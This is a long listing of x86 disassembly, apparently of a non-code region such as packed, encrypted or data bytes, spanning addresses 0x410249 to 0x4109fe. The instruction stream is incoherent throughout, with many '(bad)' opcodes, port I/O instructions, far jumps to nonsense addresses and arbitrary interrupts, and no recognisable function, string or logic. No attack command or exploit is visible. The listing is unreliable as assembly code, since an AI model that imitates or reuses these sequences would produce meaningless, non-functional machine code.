  410249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41024a:	jl     0x410288
  41024c:	shl    DWORD PTR [ecx+0x20],1
  41024f:	add    eax,DWORD PTR [eax-0x3f]
  410252:	adc    ecx,DWORD PTR [ebp-0x27a59bcb]
  410258:	scas   al,BYTE PTR es:[edi]
  410259:	dec    edi
  41025a:	fldenv fs:[edi]
  41025d:	and    al,0xf5
  41025f:	test   bh,0xb3
  410262:	test   eax,0x9250a4
  410267:	or     ebp,edx
  410269:	and    al,0x73
  41026b:	pop    edx
  41026c:	stos   BYTE PTR es:[edi],al
  41026d:	dec    ecx
  41026e:	xchg   esp,eax
  41026f:	mov    ebp,0x594d7185
  410274:	loop   0x410217
  410276:	mov    dl,0x32
  410278:	je     0x410280
  41027a:	stos   DWORD PTR es:[edi],eax
  41027b:	clc    
  41027c:	(bad)  
  41027d:	sbb    BYTE PTR [edx+0x7f238c90],ah
  410283:	add    eax,0x74978453
  410288:	jecxz  0x410251
  41028a:	scas   eax,DWORD PTR es:[edi]
  41028b:	icebp  
  41028c:	and    eax,0x6fd72ed7
  410291:	jbe    0x4102e3
  410293:	out    0xcb,al
  410295:	out    dx,al
  410296:	or     al,BYTE PTR [ebp+edi*2+0x38]
  41029a:	jo     0x4102ed
  41029c:	rcr    DWORD PTR es:[ecx+0x228c3dc4],0xd2
  4102a4:	or     eax,0x4523b78c
  4102a9:	retf   
  4102aa:	dec    ebx
  4102ab:	test   esi,ebx
  4102ad:	test   edx,ebp
  4102af:	pushf  
  4102b0:	cld    
  4102b1:	mov    dl,0x98
  4102b3:	fstp   DWORD PTR [ecx*8+0x5ede16d5]
  4102ba:	xchg   esi,esp
  4102bc:	int    0xf6
  4102be:	dec    edx
  4102bf:	rcr    al,1
  4102c1:	retf   
  4102c2:	cdq    
  4102c3:	push   ebp
  4102c4:	retf   
  4102c5:	js     0x410346
  4102c7:	xchg   edx,eax
  4102c8:	or     BYTE PTR ss:[edi-0x437f2f8],al
  4102cf:	loope  0x4102c5
  4102d1:	pop    esp
  4102d2:	cmp    eax,DWORD PTR [eax+ecx*8+0x5e64f43e]
  4102d9:	lock sbb edx,edi
  4102dc:	sbb    BYTE PTR [ebx-0x36],0x3e
  4102e0:	mov    dh,0x46
  4102e2:	shl    BYTE PTR [ebx+ebp*1+0x6],1
  4102e6:	dec    esp
  4102e7:	not    BYTE PTR [edx-0x1917775f]
  4102ed:	jmp    0x2cd8067d
  4102f2:	aad    0x77
  4102f4:	aaa    
  4102f5:	mov    DWORD PTR [esi+eax*2+0x2202bb66],0xb7bbfb5f
  410300:	imul   ebp,DWORD PTR [eax-0x71389632],0x7c4360cd
  41030a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41030b:	fnsave [edi-0x2f]
  41030e:	adc    al,0x76
  410310:	lahf   
  410311:	aas    
  410312:	cmp    cl,BYTE PTR [eax]
  410314:	rol    edi,cl
  410316:	aas    
  410317:	jmp    0x410350
  410319:	fwait
  41031a:	jno    0x410322
  41031c:	sti    
  41031d:	call   0x7e6e1414
  410322:	inc    edi
  410323:	jno    0x4102df
  410325:	mov    al,0xdd
  410327:	out    0x42,eax
  410329:	out    dx,eax
  41032a:	and    ch,BYTE PTR [eax+0x7a]
  41032d:	lea    edi,[edi]
  41032f:	push   es
  410330:	nop
  410331:	popf   
  410332:	das    
  410333:	les    edi,FWORD PTR [ebp+0x52c0e26d]
  410339:	scas   eax,DWORD PTR es:[edi]
  41033a:	push   cs
  41033b:	ret    0xa096
  41033e:	stos   DWORD PTR es:[edi],eax
  41033f:	sbb    al,dh
  410341:	int    0xa6
  410343:	pusha  
  410344:	inc    esi
  410345:	jmp    0xc127aaab
  41034a:	ins    BYTE PTR es:[edi],dx
  41034b:	add    al,0x78
  41034d:	sub    eax,0x574c6a4a
  410352:	push   edi
  410353:	and    esp,eax
  410355:	in     eax,dx
  410356:	push   ebp
  410357:	sti    
  410358:	cmp    al,0x90
  41035a:	mov    ah,0xba
  41035c:	push   ecx
  41035d:	imul   esi,DWORD PTR ds:0x28a19638,0xffffffc8
  410364:	ror    edi,cl
  410366:	cmp    DWORD PTR [eax],esp
  410368:	ins    BYTE PTR es:[edi],dx
  410369:	dec    edx
  41036a:	sahf   
  41036b:	outs   dx,DWORD PTR ds:[esi]
  41036c:	les    esp,FWORD PTR gs:[edx]
  41036f:	test   DWORD PTR [ebx],ebx
  410371:	adc    al,0xa3
  410373:	pop    ecx
  410374:	and    al,0x2f
  410376:	adc    ebx,DWORD PTR [eax-0xc]
  410379:	dec    esi
  41037a:	xchg   BYTE PTR ds:0xf7c29c26,bl
  410380:	cmc    
  410381:	sbb    ebp,ebp
  410383:	jp     0x410376
  410385:	inc    ebp
  410386:	adc    bl,dh
  410388:	xchg   ebx,eax
  410389:	and    bl,BYTE PTR [esi-0x7b2b8c44]
  41038f:	xor    al,0xb5
  410391:	aam    0x96
  410393:	jns    0x410347
  410395:	xor    ah,ch
  410397:	mov    esi,0x3539c690
  41039c:	and    dl,BYTE PTR [eax-0x6]
  41039f:	imul   edi,DWORD PTR [ecx-0x5e76ffec],0x7987271
  4103a9:	pop    ebx
  4103aa:	enter  0x9bf3,0x27
  4103ae:	js     0x41036c
  4103b0:	sahf   
  4103b1:	fsubr  DWORD PTR ds:0xa79c3981
  4103b7:	aad    0x8b
  4103b9:	pusha  
  4103ba:	out    dx,eax
  4103bb:	xchg   ebx,eax
  4103bc:	mov    cl,cl
  4103be:	stos   BYTE PTR es:[edi],al
  4103bf:	in     al,dx
  4103c0:	adc    esi,ebx
  4103c2:	xchg   edi,eax
  4103c3:	dec    ebp
  4103c4:	add    ecx,edi
  4103c6:	xchg   DWORD PTR [ecx+0x26c1cde9],ebx
  4103cc:	std    
  4103cd:	and    bl,BYTE PTR [edx-0x67ac5203]
  4103d3:	jno    0x410453
  4103d5:	cld    
  4103d6:	push   edi
  4103d7:	add    DWORD PTR [edx-0x28],ebx
  4103da:	mov    ch,0xed
  4103dc:	into   
  4103dd:	aas    
  4103de:	pop    esp
  4103df:	inc    edi
  4103e0:	and    dl,BYTE PTR ds:0x3e49d328
  4103e6:	bound  ecx,QWORD PTR [eax]
  4103e8:	je     0x4103fe
  4103ea:	test   eax,0xe75d9f6b
  4103ef:	jp     0x41038b
  4103f1:	cli    
  4103f2:	pop    esp
  4103f3:	mov    edx,0x3ba573c2
  4103f8:	sti    
  4103f9:	mov    eax,0xf935e2a
  4103fe:	sar    DWORD PTR ds:0x190ff000,1
  410404:	lock sub BYTE PTR [ecx+ebp*2],dl
  410408:	cmc    
  410409:	xor    DWORD PTR [ecx+0x6233555c],eax
  41040f:	aaa    
  410410:	cmp    eax,0x75612edf
  410415:	dec    esp
  410416:	mov    esp,0x4adf2000
  41041b:	scas   eax,DWORD PTR es:[edi]
  41041c:	and    eax,0xfffffff3
  41041f:	push   esp
  410420:	mov    ebp,DWORD PTR [ecx]
  410422:	cld    
  410423:	xchg   esi,eax
  410424:	int3   
  410425:	aas    
  410426:	xchg   esp,eax
  410427:	in     al,0x89
  410429:	adc    BYTE PTR [edi],bl
  41042b:	jl     0x410446
  41042d:	push   esp
  41042e:	pop    esp
  41042f:	jl     0x4104a6
  410431:	pop    ss
  410432:	ins    DWORD PTR es:[edi],dx
  410433:	(bad)  
  410434:	out    dx,eax
  410435:	shr    BYTE PTR [edx+0x5c3217be],0xad
  41043c:	lahf   
  41043d:	pop    es
  41043e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043f:	test   al,0x69
  410441:	cli    
  410442:	int    0xaa
  410444:	xor    bl,BYTE PTR [edx+0x662a1d56]
  41044a:	(bad)  
  41044b:	fidivr WORD PTR [ecx+ecx*8+0x4a9910bd]
  410452:	xlat   BYTE PTR ds:[ebx]
  410453:	sub    DWORD PTR [ecx+0x5e723ad5],esp
  410459:	mov    ecx,0x5daad15d
  41045e:	iret   
  41045f:	xchg   ebx,edi
  410461:	(bad)
  410464:	sahf   
  410465:	lds    ebp,FWORD PTR [edi+ecx*8+0x1b]
  410469:	mov    edi,0xb88397ec
  41046e:	and    ah,ah
  410470:	aad    0xd5
  410472:	xor    al,0x41
  410474:	fs pusha 
  410476:	aam    0xa
  410478:	xlat   BYTE PTR ds:[ebx]
  410479:	enter  0xf1d3,0xb1
  41047d:	xlat   BYTE PTR ds:[ebx]
  41047e:	dec    ebx
  41047f:	loope  0x41044c
  410481:	and    al,0x1c
  410483:	cmp    BYTE PTR ds:[esi-0x381689a4],ah
  41048a:	in     eax,dx
  41048b:	mov    eax,0xde7d28a6
  410490:	sti    
  410491:	lods   eax,DWORD PTR ds:[esi]
  410492:	jmp    0x9166ca62
  410497:	sub    ebx,ebp
  410499:	mov    ebx,0xe56044ee
  41049e:	mov    ds,WORD PTR [ebx-0x501f5f1e]
  4104a4:	ror    BYTE PTR [eax],cl
  4104a6:	mov    ebx,0xa710fee4
  4104ab:	xor    dh,BYTE PTR [esi+0x66]
  4104ae:	icebp  
  4104af:	and    edx,DWORD PTR [esi]
  4104b1:	or     DWORD PTR [edx-0x49],esi
  4104b4:	sti    
  4104b5:	pop    ebp
  4104b6:	sub    al,0x6
  4104b8:	aam    0xc1
  4104ba:	not    DWORD PTR [ecx+0x8497fa3]
  4104c0:	mov    ebx,0x13516b62
  4104c5:	outs   dx,BYTE PTR ds:[esi]
  4104c6:	shl    edx,1
  4104c8:	jmp    DWORD PTR ds:0xe7507b49
  4104ce:	js     0x4104a0
  4104d0:	fisttp DWORD PTR ds:0x334d89fd
  4104d6:	int3   
  4104d7:	push   edx
  4104d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104d9:	(bad)  
  4104da:	out    0x5,al
  4104dc:	jl     0x4104c6
  4104de:	dec    edi
  4104df:	call   0x8bc6:0xf1b70b8a
  4104e6:	pop    eax
  4104e7:	cmp    esi,DWORD PTR [eax-0x20]
  4104ea:	int    0xc1
  4104ec:	push   ebx
  4104ed:	mov    esi,esi
  4104ef:	or     al,0x1b
  4104f1:	cmp    bh,BYTE PTR [edx*2-0x19123324]
  4104f8:	inc    esp
  4104f9:	jnp    0x4104e9
  4104fb:	out    0xa,al
  4104fd:	loop   0x410504
  4104ff:	fwait
  410500:	lea    esi,[esi-0x144df9a5]
  410506:	dec    ebp
  410507:	pop    esp
  410508:	add    eax,0x9a089c66
  41050d:	sub    esi,DWORD PTR [esi]
  41050f:	mov    dl,ch
  410511:	xchg   DWORD PTR [edi],esp
  410513:	aaa    
  410514:	out    dx,eax
  410515:	jo     0x4104e3
  410517:	push   es
  410518:	(bad)  
  410519:	rol    DWORD PTR [edx+0x46],cl
  41051c:	and    cl,ch
  41051e:	cmp    BYTE PTR [ebx],bl
  410520:	shl    BYTE PTR [edi+ecx*4-0x1999a985],cl
  410527:	stos   DWORD PTR es:[edi],eax
  410528:	pusha  
  410529:	xchg   ebp,eax
  41052a:	loopne 0x4104bd
  41052c:	xchg   BYTE PTR [esi-0x211bd321],dl
  410532:	jno    0x41056d
  410534:	sbb    bh,bl
  410536:	mov    edi,0x748de6a4
  41053b:	das    
  41053c:	scas   eax,DWORD PTR es:[edi]
  41053d:	push   sp
  41053f:	loop   0x41052e
  410541:	dec    ecx
  410542:	adc    eax,0x2dcd1e91
  410547:	fstp   TBYTE PTR [edx+0x27]
  41054a:	dec    ecx
  41054b:	sub    DWORD PTR [esi],edx
  41054d:	shr    DWORD PTR [esi+0x762c1d0d],1
  410553:	pop    edx
  410554:	jb     0x4105a6
  410556:	pop    ds
  410557:	iret   
  410558:	adc    eax,0x56465376
  41055d:	in     eax,0xb8
  41055f:	imul   edi,DWORD PTR [eax],0xfbbffa56
  410565:	daa    
  410566:	leave  
  410567:	mov    edx,0x6f3afff9
  41056c:	dec    ecx
  41056d:	ds push edx
  41056f:	or     ah,BYTE PTR es:[eax-0x6e3ab861]
  410576:	or     esi,DWORD PTR ds:0x2d401c30
  41057c:	daa    
  41057d:	jno    0x410526
  41057f:	pop    ebx
  410580:	cmp    ebp,edi
  410582:	std    
  410583:	and    eax,0x4e54dc01
  410588:	inc    esi
  410589:	mov    eax,ds:0xc5c62075
  41058e:	xchg   esi,eax
  41058f:	scas   eax,DWORD PTR es:[edi]
  410590:	out    dx,eax
  410591:	fs cmp al,0xbf
  410594:	dec    ecx
  410595:	mov    dl,0x10
  410597:	ja     0x410574
  410599:	dec    ecx
  41059a:	inc    ecx
  41059b:	das    
  41059c:	je     0x410548
  41059e:	fdivr  QWORD PTR [ebp-0xc]
  4105a1:	popa   
  4105a2:	add    BYTE PTR [esi-0x33],bh
  4105a5:	sbb    al,ch
  4105a7:	mov    esi,0xd0a38606
  4105ac:	in     al,dx
  4105ad:	xchg   esi,eax
  4105ae:	add    BYTE PTR [esi+edi*2],ah
  4105b1:	mov    ecx,0x3a2ec79a
  4105b6:	fstp   DWORD PTR [edi-0x4c]
  4105b9:	js     0x41059c
  4105bb:	dec    eax
  4105bc:	hlt    
  4105bd:	call   0x79b6:0xf7fcf025
  4105c4:	repz mov al,ds:0xda53f385
  4105ca:	das    
  4105cb:	xchg   esi,eax
  4105cc:	mov    ebx,0xeebcecc1
  4105d1:	or     eax,0xa6f706b8
  4105d6:	pop    es
  4105d7:	not    DWORD PTR [ecx]
  4105d9:	xor    ch,ah
  4105db:	xchg   ecx,eax
  4105dc:	cmc    
  4105dd:	push   0x9e63847e
  4105e2:	pop    esp
  4105e3:	and    eax,0xc164af8a
  4105e8:	jmp    0x1b9b2ddc
  4105ed:	ja     0x4105c9
  4105ef:	jmp    0x33fde223
  4105f4:	nop
  4105f5:	push   ecx
  4105f6:	adc    bh,BYTE PTR [edx-0x2c2c3881]
  4105fc:	xchg   edx,eax
  4105fd:	sahf   
  4105fe:	jae    0x4105d5
  410600:	(bad)  
  410601:	das    
  410602:	xchg   ebx,eax
  410603:	jo     0x4105eb
  410605:	out    0x3e,eax
  410607:	dec    eax
  410608:	adc    eax,0x9f8977fc
  41060d:	sbb    dl,ch
  41060f:	loop   0x410679
  410611:	sub    bl,BYTE PTR [ebp+0x41608212]
  410617:	fmul   DWORD PTR [esi]
  410619:	sub    DWORD PTR [edx],0xffffffaa
  41061c:	add    ah,BYTE PTR [ecx]
  41061e:	leave  
  41061f:	and    bl,BYTE PTR [ebp-0x156b5cff]
  410625:	rcr    DWORD PTR [ecx-0x55ffa84f],cl
  41062b:	push   cs
  41062c:	add    al,0x5
  41062e:	lods   al,BYTE PTR ds:[esi]
  41062f:	mov    dx,0x7ea3
  410633:	inc    esp
  410634:	repz mov al,ds:0x871f2e08
  41063a:	sub    BYTE PTR [edi+0x6e],0x1d
  41063e:	out    0x86,eax
  410640:	pop    esp
  410641:	imul   edx,DWORD PTR ss:[ecx],0xb
  410645:	or     bh,dl
  410647:	mov    ebx,0x57c7d55c
  41064c:	add    dh,BYTE PTR fs:[edx]
  41064f:	fwait
  410650:	call   0x7776a215
  410655:	cli    
  410656:	aaa    
  410657:	lock ds sub dh,0x68
  41065c:	mov    esi,0x1f41e56b
  410661:	xlat   BYTE PTR ds:[ebx]
  410662:	loope  0x4106cb
  410664:	(bad)  [edx]
  410666:	jb     0x4106bf
  410668:	and    ah,BYTE PTR [edx]
  41066a:	mov    dh,0x45
  41066c:	and    al,0xd9
  41066e:	outs   dx,DWORD PTR ds:[esi]
  41066f:	in     al,dx
  410670:	mov    eax,0xe82110e6
  410675:	jg     0x410643
  410677:	ja     0x4106c9
  410679:	sbb    eax,0xd4f3eeef
  41067e:	adc    al,bh
  410680:	adc    DWORD PTR [ebx+ebp*8],esi
  410683:	xor    al,0xba
  410685:	mov    bl,0x4b
  410687:	repz mov dh,0x95
  41068a:	inc    ebp
  41068b:	jne    0x4106dd
  41068d:	xchg   edi,eax
  41068e:	fwait
  41068f:	sbb    al,0x81
  410691:	inc    edx
  410692:	loopne 0x410679
  410694:	sbb    dh,BYTE PTR [edi+0xb]
  410697:	pop    eax
  410698:	sbb    eax,0x8c08236b
  41069d:	in     al,0x17
  41069f:	fstp   TBYTE PTR [ebp+0x4a]
  4106a2:	dec    esi
  4106a3:	xchg   ecx,eax
  4106a4:	sbb    ebx,DWORD PTR [ecx-0x12]
  4106a7:	sbb    ch,BYTE PTR [ecx]
  4106a9:	mov    ch,0x60
  4106ab:	rcr    BYTE PTR [ebx],cl
  4106ad:	stos   BYTE PTR es:[edi],al
  4106ae:	pop    ds
  4106af:	or     DWORD PTR [esp+ebp*8-0x3777db61],0xffffff98
  4106b7:	inc    eax
  4106b8:	jnp    0x410689
  4106ba:	xchg   esp,eax
  4106bb:	aaa    
  4106bc:	mov    DWORD PTR [eax+0x5a618f86],ecx
  4106c2:	inc    ebx
  4106c3:	mov    eax,DWORD PTR [ebx+0x52]
  4106c6:	jg     0x410674
  4106c8:	jecxz  0x41073e
  4106ca:	jae    0x4106eb
  4106cc:	lods   eax,DWORD PTR ds:[esi]
  4106cd:	mov    ebp,DWORD PTR [eax]
  4106cf:	clc    
  4106d0:	mov    esp,0x64f9c525
  4106d5:	jp     0x410673
  4106d7:	pop    ds
  4106d8:	test   DWORD PTR [ecx-0xbe4ada6],edi
  4106de:	inc    ebx
  4106df:	cs jg  0x410679
  4106e2:	push   ebp
  4106e3:	xor    BYTE PTR [eax],dh
  4106e5:	dec    esi
  4106e6:	imul   eax,edx,0xffffffc0
  4106e9:	inc    esi
  4106ea:	test   eax,0x5c2ff197
  4106ef:	lods   al,BYTE PTR ss:[esi]
  4106f1:	xchg   esp,eax
  4106f2:	xchg   esi,eax
  4106f3:	xchg   ecx,eax
  4106f4:	xchg   BYTE PTR [edx+esi*4+0x4],bh
  4106f8:	xchg   esi,eax
  4106f9:	arpl   WORD PTR [edx-0x7f],cx
  4106fc:	adc    edx,DWORD PTR [si]
  4106ff:	(bad)  
  410700:	xor    DWORD PTR [edi+0x1b],0x2c
  410704:	ins    BYTE PTR es:[edi],dx
  410705:	jle    0x4106af
  410707:	sub    edi,ecx
  410709:	fild   WORD PTR [ebp-0x4beb345f]
  41070f:	ror    bh,cl
  410711:	pop    ss
  410712:	inc    edi
  410713:	gs pop ds
  410715:	mov    dh,0x24
  410717:	loop   0x410766
  410719:	dec    ebp
  41071a:	fadd   QWORD PTR [ebp+0x7d1f1b73]
  410720:	sbb    bl,bh
  410722:	enter  0xe399,0xc3
  410726:	and    esi,ebp
  410728:	and    cl,al
  41072a:	push   eax
  41072b:	aas    
  41072c:	retf   0x6fbf
  41072f:	xchg   edx,eax
  410730:	addr16 jns 0x410755
  410733:	sub    edx,DWORD PTR [esi-0x5975ddf0]
  410739:	add    BYTE PTR [ebp-0x75d9447c],dh
  41073f:	push   esp
  410740:	sub    al,0xf8
  410742:	xchg   esp,eax
  410743:	inc    ebx
  410744:	dec    edi
  410745:	mov    ebx,0x911073ed
  41074a:	sahf   
  41074b:	pop    es
  41074c:	or     eax,0xb0b97c0
  410751:	and    BYTE PTR [esi-0x2a564add],al
  410757:	iret   
  410758:	stos   DWORD PTR es:[edi],eax
  410759:	jecxz  0x41075c
  41075b:	daa    
  41075c:	ja     0x410721
  41075e:	pop    ss
  41075f:	into   
  410760:	retf   
  410761:	xor    al,0x41
  410764:	or     ah,BYTE PTR [eax+0xc85f6a0]
  41076a:	add    BYTE PTR [edx+0x3b],al
  41076d:	std    
  41076e:	shr    BYTE PTR [eax],0x67
  410771:	jg     0x4107d1
  410773:	test   al,0x4b
  410775:	sub    al,0x61
  410777:	inc    esi
  410778:	add    ecx,ebp
  41077a:	inc    ecx
  41077b:	cld    
  41077c:	mov    eax,ds:0x339129c7
  410781:	mov    esi,0xa5713dfc
  410786:	retf   
  410787:	mov    bh,0x81
  410789:	popa   
  41078a:	cmp    DWORD PTR [ebx],edi
  41078c:	aas    
  41078d:	xchg   DWORD PTR [ebp+0x7c],ecx
  410790:	pushf  
  410791:	daa    
  410792:	xchg   edi,eax
  410793:	xchg   ecx,eax
  410794:	jge    0x4107e7
  410796:	mov    eax,0x55a3c66a
  41079b:	mov    bl,0xf7
  41079d:	and    al,0x77
  41079f:	jne    0x4107cf
  4107a1:	jecxz  0x4107f7
  4107a3:	std    
  4107a4:	jo     0x4107d4
  4107a6:	push   cs
  4107a7:	push   0xfffffffb
  4107a9:	xchg   edx,eax
  4107aa:	jno    0x410770
  4107ac:	or     dl,BYTE PTR [eax-0x3f]
  4107af:	add    cl,BYTE PTR [ebx+0x52]
  4107b2:	leave  
  4107b3:	pushf  
  4107b4:	cs loopne 0x410759
  4107b7:	mov    edx,0xd28a3c47
  4107bc:	push   edx
  4107bd:	test   al,0x42
  4107bf:	shr    BYTE PTR [edi-0x276d2908],1
  4107c5:	cmp    al,0xe7
  4107c7:	jecxz  0x4107de
  4107c9:	mov    al,ds:0xa875e572
  4107ce:	adc    ecx,0xffffffd2
  4107d1:	push   esi
  4107d2:	jg     0x410833
  4107d4:	je     0x410807
  4107d6:	adc    DWORD PTR [edi],0x5fb2205e
  4107dc:	or     al,0x1
  4107de:	(bad)  
  4107e0:	mov    edi,0x94ce1c02
  4107e5:	dec    esp
  4107e6:	xchg   esi,eax
  4107e7:	sub    BYTE PTR [edx+0x3c],bl
  4107ea:	sub    ah,BYTE PTR [ebx-0x2bf948cd]
  4107f0:	test   eax,0x70d454da
  4107f5:	xchg   BYTE PTR [edi-0x20],dh
  4107f8:	adc    eax,0x16271d
  4107fd:	(bad)  
  4107fe:	scas   eax,DWORD PTR es:[edi]
  4107ff:	cmp    al,0x9c
  410801:	inc    ecx
  410802:	pushf  
  410803:	retf   0xa86f
  410806:	mov    ds:0x5d4b137c,eax
  41080b:	ins    DWORD PTR es:[edi],dx
  41080c:	iret   
  41080d:	imul   DWORD PTR [edx+edx*8-0x40]
  410811:	mov    BYTE PTR [edx-0x48080eea],al
  410817:	xor    esi,DWORD PTR [edi+0x22]
  41081a:	mov    bl,0x4b
  41081c:	pop    es
  41081d:	cmp    ch,al
  41081f:	xchg   edx,eax
  410820:	mov    DWORD PTR cs:[edi-0x1021fd07],edi
  410827:	out    dx,al
  410828:	loop   0x410821
  41082a:	cld    
  41082b:	clc    
  41082c:	mov    esi,0x5f96e657
  410831:	jmp    0x7358fc3e
  410836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410837:	pop    ecx
  410838:	pop    eax
  410839:	pop    esi
  41083a:	pop    ss
  41083b:	and    eax,0x2a5e2a11
  410840:	xchg   ch,dh
  410842:	ds inc eax
  410844:	iret   
  410845:	pop    es
  410846:	je     0x4107d9
  410848:	dec    ebp
  410849:	addr16 int 0xde
  41084c:	push   esi
  41084d:	aaa    
  41084e:	inc    esi
  41084f:	repnz sbb eax,0x56767169
  410855:	adc    esp,ebp
  410857:	leave  
  410858:	fsubr  QWORD PTR [eax]
  41085a:	sbb    ah,BYTE PTR [eax+0x7e]
  41085d:	inc    ebp
  41085e:	fadd   st(0),st
  410860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410861:	test   bl,dl
  410863:	mov    al,0xe8
  410865:	ret    0x6c88
  410868:	das    
  410869:	jmp    0xc4bc:0x711c8f7d
  410870:	stos   DWORD PTR es:[edi],eax
  410871:	cmp    eax,0x51587afc
  410876:	sbb    dl,cl
  410878:	inc    esp
  410879:	jmp    0x41089e
  41087b:	adc    al,0x91
  41087d:	repz test al,0xc9
  410880:	add    al,0xff
  410882:	cdq    
  410883:	sbb    dl,BYTE PTR [ebp+0x7f53d45b]
  410889:	ins    DWORD PTR es:[edi],dx
  41088a:	xor    al,0xb
  41088c:	mov    eax,DWORD PTR [ebp-0x5a]
  41088f:	aas    
  410890:	xor    al,0xd7
  410892:	mov    ch,0xe3
  410894:	jae    0x4108cb
  410896:	fs mov edi,ecx
  410899:	xor    bh,0xd4
  41089c:	loopne 0x41084e
  41089e:	daa    
  41089f:	push   es
  4108a0:	shl    BYTE PTR [ecx],cl
  4108a2:	cmp    ecx,edi
  4108a4:	std    
  4108a5:	dec    ebx
  4108a6:	std    
  4108a7:	(bad)  
  4108a8:	pop    ebx
  4108a9:	outs   dx,BYTE PTR ds:[esi]
  4108aa:	dec    eax
  4108ab:	sbb    DWORD PTR [ebx-0x65],edi
  4108ae:	pop    esi
  4108af:	stc    
  4108b0:	adc    dh,BYTE PTR [ebp-0x4e]
  4108b3:	stc    
  4108b4:	popf   
  4108b5:	retf   0xe304
  4108b8:	sbb    esi,edx
  4108ba:	lahf   
  4108bb:	in     eax,0x94
  4108bd:	xchg   edx,eax
  4108be:	rcr    DWORD PTR [esi+0x78],cl
  4108c1:	mov    ch,0x95
  4108c3:	jecxz  0x410888
  4108c5:	add    BYTE PTR [ecx+0x2c],al
  4108c8:	pop    esp
  4108c9:	adc    eax,0x68cc299
  4108ce:	jecxz  0x410895
  4108d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d1:	lods   al,BYTE PTR ds:[esi]
  4108d2:	inc    ebx
  4108d3:	pop    edx
  4108d4:	aam    0x72
  4108d6:	(bad)  
  4108d7:	in     eax,0x73
  4108d9:	mov    ebx,DWORD PTR [edi-0x7d]
  4108dc:	adc    BYTE PTR [eax+ebx*4+0x30194b6c],0x5c
  4108e4:	or     al,0x2c
  4108e6:	pop    ebp
  4108e7:	adc    eax,esp
  4108e9:	mov    bl,0x1b
  4108eb:	xor    al,ch
  4108ed:	hlt    
  4108ee:	cli    
  4108ef:	into   
  4108f0:	jns    0x4108ba
  4108f2:	mov    al,ds:0xa71e6460
  4108f7:	ins    BYTE PTR es:[edi],dx
  4108f8:	mov    ss,edi
  4108fa:	pop    edi
  4108fb:	jo     0x41088b
  4108fd:	xor    al,BYTE PTR [bp+si-0x171b]
  410902:	jle    0x410906
  410904:	and    bl,BYTE PTR [esi-0x68d5a257]
  41090a:	sub    ebx,esi
  41090c:	jno    0x410969
  41090e:	dec    eax
  41090f:	loopne 0x410924
  410911:	inc    ebp
  410912:	or     BYTE PTR [esi-0x61a2bea6],dh
  410918:	mov    ?,WORD PTR [ecx]
  41091a:	push   es
  41091b:	shl    BYTE PTR [esi-0x2e],cl
  41091e:	scas   eax,DWORD PTR es:[edi]
  41091f:	xlat   BYTE PTR ds:[ebx]
  410920:	fs pop ebx
  410922:	pop    ebx
  410923:	sahf   
  410924:	push   eax
  410925:	pusha  
  410926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410927:	mov    ecx,0xc5586d1c
  41092c:	mov    cl,0x31
  41092e:	imul   ecx,DWORD PTR [edi-0x1d51029b],0x28
  410935:	jmp    0x8eab4007
  41093a:	sub    edi,DWORD PTR [edx-0x53]
  41093d:	test   eax,0x46de9769
  410942:	cmp    BYTE PTR [edi],ah
  410944:	push   ds
  410945:	cld    
  410946:	mov    esp,0x8f64f57
  41094b:	mov    al,0xe6
  41094d:	cs inc edx
  41094f:	jae    0x4109c5
  410951:	jo     0x410980
  410953:	jecxz  0x410951
  410955:	outs   dx,BYTE PTR ds:[esi]
  410956:	and    ah,BYTE PTR [edi-0x76]
  410959:	enter  0xbd78,0xe2
  41095d:	or     bl,BYTE PTR [edi]
  41095f:	adc    DWORD PTR [ecx-0xa1e5659],esi
  410965:	jmp    0x4109c4
  410967:	pop    edx
  410968:	xor    esp,0x423d9f6d
  41096e:	mov    DWORD PTR [ecx-0x70],esi
  410971:	mov    dh,0x67
  410973:	jecxz  0x4109e3
  410975:	sahf   
  410976:	pop    ss
  410977:	lea    ebp,[esi]
  410979:	adc    edi,DWORD PTR [ebp+eiz*2+0x5d]
  41097d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097e:	xor    eax,0x4c45735a
  410983:	jbe    0x4109ab
  410985:	mov    ds:0xbfb30046,eax
  41098a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41098b:	(bad)  
  41098c:	cli    
  41098d:	repz aad 0x9f
  410990:	dec    ebx
  410991:	mov    dl,0x7e
  410993:	mov    BYTE PTR [edi-0x3ee64105],dh
  410999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41099a:	push   ds
  41099b:	pop    ecx
  41099c:	ficomp DWORD PTR [ebp+0x643dcf6c]
  4109a2:	adc    ebp,DWORD PTR [esi-0x21]
  4109a5:	lds    ebx,FWORD PTR ds:0x89a5bda
  4109ab:	sub    esi,ebx
  4109ad:	shl    dl,cl
  4109af:	pop    edi
  4109b0:	(bad)  
  4109b1:	push   eax
  4109b2:	stos   DWORD PTR es:[edi],eax
  4109b3:	xchg   DWORD PTR [esi+0x614c85d2],ebx
  4109b9:	(bad)  
  4109bb:	push   edx
  4109bc:	pop    ebx
  4109bd:	and    al,0x5e
  4109bf:	mov    bl,0x8b
  4109c1:	les    edx,FWORD PTR [esi+0x2f0f3b7]
  4109c7:	stc    
  4109c8:	inc    ebx
  4109c9:	pop    esp
  4109ca:	pop    ss
  4109cb:	repnz pop esi
  4109cd:	pop    ecx
  4109ce:	push   edi
  4109cf:	dec    ebp
  4109d0:	mov    al,0x98
  4109d2:	jo     0x4109d0
  4109d4:	push   es
  4109d5:	test   BYTE PTR [ebx+0x5b],ah
  4109d8:	cmp    ebp,esp
  4109da:	out    0x7d,al
  4109dc:	jne    0x4109e3
  4109de:	in     eax,0x91
  4109e0:	rol    ch,0xc8
  4109e3:	mov    al,0xa4
  4109e5:	add    cl,BYTE PTR [edx-0x1fe5bf16]
  4109eb:	pop    ebx
  4109ec:	push   cs
  4109ed:	sbb    BYTE PTR [edi+0x4208c9b9],0xad
  4109f4:	mov    eax,ds:0x6f01944
  4109f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109fa:	pop    es
  4109fb:	sub    al,0xf8
  4109fd:	dec    edi
  4109fe:	and    DWORD PTR [eax-0x53d6b017],0xb76d3939
